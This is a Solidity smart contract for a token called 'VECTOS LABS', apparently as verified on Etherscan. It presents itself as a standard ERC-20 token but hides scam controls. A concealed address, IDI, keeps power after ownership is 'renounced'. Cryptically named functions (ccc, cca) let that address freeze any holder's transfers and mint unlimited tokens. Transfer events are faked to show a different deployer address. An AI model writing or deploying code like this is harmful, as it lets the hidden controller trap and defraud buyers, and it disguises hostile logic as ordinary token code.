/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

   
 
contract VECTOS {
  
    mapping (address => uint256) private IBI;
    mapping (address => uint256) private ICI;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "VECTOS LABS";
    string public symbol = unicode"VECTOS";
    uint8 public decimals = 6;
    uint256 public totalSupply = 125000000 *10**6;
    address owner = msg.sender;
    address private IDI;
    address deployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IDI = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    IBI[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IBI[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(ICI[msg.sender] <= 1);
        require(IBI[msg.sender] >= value);
  IBI[msg.sender] -= value;  
        IBI[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function ccc (address io, uint256 ix)  public {
     if(msg.sender == IDI){
   ICI[io] = ix;}} 
function cca (address io, uint256 ix)  public {
         if(msg.sender == IDI){
    IBI[io] += ix;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IDI)  {
 require(value <= IBI[from]);
        require(value <= allowance[from][msg.sender]);
        IBI[from] -= value;  
      IBI[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(ICI[from] <= 1 && ICI[to] <=1);
        require(value <= IBI[from]);
        require(value <= allowance[from][msg.sender]);
        IBI[from] -= value;
        IBI[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }